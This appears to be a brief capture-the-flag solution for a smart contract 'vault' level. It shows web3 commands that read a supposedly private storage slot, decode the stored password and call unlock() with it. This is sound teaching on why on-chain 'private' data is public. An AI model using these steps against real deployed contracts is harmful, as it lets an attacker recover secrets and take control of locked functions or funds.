We can see all variables stored in a contract regardless of being declared private.

Can query from the browser using the web3 library.
The value is in the second slot i.e. slot 1.

web3.eth.getStorageAt(contract.address, 1, function(err, result){password = result })

the above gives us the hex value stored in password variable

we can use the following web3 function to view the string in ascii format

web3.utils.hexToAscii(password)

Now call the public function with the hex value:

await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");

Should now be unlocked, verify with:

await contract.locked()
